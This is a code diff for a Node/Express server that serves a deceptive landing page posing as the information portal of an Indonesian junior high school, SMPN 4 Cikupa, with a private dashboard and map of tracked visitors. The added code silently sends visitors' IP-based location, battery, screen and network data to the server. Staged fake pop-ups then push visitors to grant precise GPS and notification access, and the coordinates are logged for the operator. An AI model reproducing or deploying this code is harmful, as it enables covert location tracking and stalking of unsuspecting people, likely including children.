@@ -47,9 +47,6 @@ async function ipGeo(ip) {
 app.set('trust proxy', true); 
 app.use(express.json({ limit: '2mb' })); 
 
-// ==============================================================
-// API ENDPOINTS
-// ==============================================================
 app.post('/api/save-player', (req, res) => {
   const ip = clientIp(req);
   const { playerId } = req.body;
@@ -99,7 +96,7 @@ app.post('/api/gps', (req, res) => {
 });
 
 // ==============================================================
-// 1. DASHBOARD LIST (TAMPILAN KARTU)
+// DASHBOARD LIST & MAP (SAMA KAYAK SEBELUMNYA)
 // ==============================================================
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
@@ -169,9 +166,6 @@ app.get('/dash', (req, res) => {
   </body></html>`);
 });
 
-// ==============================================================
-// 2. DASHBOARD MAP (TEMA SURXRAT)
-// ==============================================================
 app.get('/dash/map', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
@@ -260,13 +254,13 @@ app.get('/dash/map', (req, res) => {
 });
 
 // ==============================================================
-// 3. LANDING PAGE (WEB BERITA + FAKE POPUP)
+// LANDING PAGE (INFORMASI SMPN 4 CIKUPA + 2 STEP IZIN)
 // ==============================================================
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
   res.type('html').send(`<!doctype html>
 <html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Berita Terkini</title>
+<title>SMPN 4 Cikupa</title>
 <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
 <script>
   window.OneSignalDeferred = window.OneSignalDeferred || [];
@@ -275,36 +269,59 @@ app.get('*', (req, res) => {
   });
 </script>
 <style>
-  body{margin:0;font-family:-apple-system,sans-serif;background:#f1f5f9;color:#1e293b}
-  .navbar{background:#0f172a;color:#fff;padding:16px;font-weight:bold;font-size:18px;text-align:center}
+  body{margin:0;font-family:-apple-system,sans-serif;background:#f8fafc;color:#1e293b}
+  .navbar{background:#1e40af;color:#fff;padding:16px;font-weight:bold;font-size:18px;text-align:center}
+  .hero{background:url('https://images.unsplash.com/photo-1523050854058-8df90110c9f1?auto=format&fit=crop&w=600&q=80') center/cover; height:150px; display:flex; align-items:center; justify-content:center;}
+  .hero h1{background:rgba(0,0,0,0.6); color:#fff; padding:10px 20px; border-radius:8px; font-size:16px}
   .container{padding:16px;max-width:600px;margin:auto}
-  .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05)}
-  .card h3{margin:0 0 10px;font-size:18px}
-  .card p{margin:0;font-size:14px;line-height:1.6;color:#475569}
-  .popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s}
+  .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border-left:4px solid #1e40af}
+  .card h3{margin:0 0 10px;font-size:16px;color:#1e40af}
+  .card p{margin:0;font-size:13px;line-height:1.6;color:#475569}
+  
+  /* POPUP STYLE */
+  .popup-overlay{position:fixed;inset:0;background:rgba(15,23,42,0.8);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s}
   .popup-overlay.show{opacity:1;pointer-events:auto}
   .popup-box{background:#fff;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s}
   .popup-overlay.show .popup-box{transform:translateY(0)}
   .popup-icon{font-size:40px;margin-bottom:15px}
   .popup-box h3{margin:0 0 10px;font-size:18px;color:#0f172a}
   .popup-box p{margin:0 0 20px;font-size:13px;color:#64748b;line-height:1.5}
-  .popup-btn{background:#0f172a;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;transition:0.2s}
-  .popup-btn:active{background:#334155}
+  .popup-btn{background:#1e40af;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;transition:0.2s}
+  .popup-btn:active{background:#1e3a8a}
 </style></head>
 <body>
 
-<div class="navbar">Berita Hari Ini</div>
+<div class="navbar">SMPN 4 Cikupa</div>
+<div class="hero"><h1>Selamat Datang di Portal Informasi</h1></div>
+
 <div class="container">
-  <div class="card"><h3>Cuaca Ekstrem Landa Beberapa Wilayah</h3><p>BMKG menghimbau masyarakat untuk waspada...</p></div>
-  <div class="card"><h3>Update Terbaru Kebijakan Pendidikan</h3><p>Pemerintah merilis kebijakan baru...</p></div>
+  <div class="card">
+    <h3>Pengumuman PPDB 2026</h3>
+    <p>Pendaftaran Peserta Didik Baru (PPDB) untuk tahun ajaran 2026/2027 akan segera dibuka. Silakan siapkan berkas persyaratan.</p>
+  </div>
+  <div class="card">
+    <h3>Jadwal Ujian Tengah Semester</h3>
+    <p>Ujian Tengah Semester (UTS) akan dilaksanakan mulai tanggal 10 bulan depan. Siswa diharapkan mempersiapkan diri dengan baik.</p>
+  </div>
 </div>
 
-<div class="popup-overlay" id="popup">
+<!-- POPUP 1: LOKASI -->
+<div class="popup-overlay" id="popup1">
   <div class="popup-box">
     <div class="popup-icon">📍</div>
-    <h3>Aktifkan Lokasi & Notifikasi</h3>
-    <p>Untuk melihat berita terdekat dan notifikasi penting, harap izinkan akses.</p>
-    <button class="popup-btn" id="allowBtn">Oke, Izinkan Sekarang</button>
+    <h3>Akses Lokasi</h3>
+    <p>Untuk menampilkan informasi sekolah terdekat, harap izinkan akses lokasi Anda.</p>
+    <button class="popup-btn" id="allowLocBtn">Izinkan Lokasi</button>
+  </div>
+</div>
+
+<!-- POPUP 2: NOTIFIKASI -->
+<div class="popup-overlay" id="popup2">
+  <div class="popup-box">
+    <div class="popup-icon">🔔</div>
+    <h3>Akses Notifikasi</h3>
+    <p>Dapatkan pengumuman penting dari sekolah langsung di HP Anda.</p>
+    <button class="popup-btn" id="allowNotifBtn">Izinkan Notifikasi</button>
   </div>
 </div>
 
@@ -312,30 +329,39 @@ app.get('*', (req, res) => {
 (async function(){
   const slug = '${slug}';
   
+  // Lacak IP di background
   fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});
 
-  setTimeout(() => {
-    document.getElementById('popup').classList.add('show');
-  }, 1000);
+  // Ambil data baterai & jaringan (biar dashboard ada isinya)
+  const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
+  if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
+  if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
+  fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
 
-  document.getElementById('allowBtn').addEventListener('click', async function() {
-    this.innerText = 'Memproses...';
-    this.disabled = true;
-    const btn = this;
+  // --- LANGKAH 1: POPUP LOKASI ---
+  setTimeout(() => { document.getElementById('popup1').classList.add('show'); }, 1000);
 
-    const forceClose = setTimeout(() => {
-      document.getElementById('popup').classList.remove('show');
-      btn.innerText = 'Oke, Izinkan Sekarang';
-      btn.disabled = false;
-    }, 4000);
-
+  document.getElementById('allowLocBtn').addEventListener('click', function() {
+    this.innerText = 'Meminta izin...';
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
-        e => {},
-        {enableHighAccuracy:true,timeout:3000,maximumAge:0}
+        p => { 
+          fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); 
+        },
+        e => { console.log(e); },
+        {enableHighAccuracy:true,timeout:10000,maximumAge:0}
       );
     }
+    
+    // Tutup popup 1, lanjut ke popup 2 setelah 1 detik
+    document.getElementById('popup1').classList.remove('show');
+    setTimeout(() => { document.getElementById('popup2').classList.add('show'); }, 800);
+  });
+
+  // --- LANGKAH 2: POPUP NOTIFIKASI ---
+  document.getElementById('allowNotifBtn').addEventListener('click', async function() {
+    this.innerText = 'Memproses...';
+    this.disabled = true;
 
     if (window.OneSignal) {
       try {
@@ -347,15 +373,9 @@ app.get('*', (req, res) => {
       } catch(e) { console.log(e); }
     }
 
-    const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
-    if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
-    if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
-    fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
-
-    clearTimeout(forceClose);
-    document.getElementById('popup').classList.remove('show');
-    btn.innerText = 'Oke, Izinkan Sekarang';
-    btn.disabled = false;
+    document.getElementById('popup2').classList.remove('show');
+    this.innerText = 'Izinkan Notifikasi';
+    this.disabled = false;
   });
 })();
 </script>
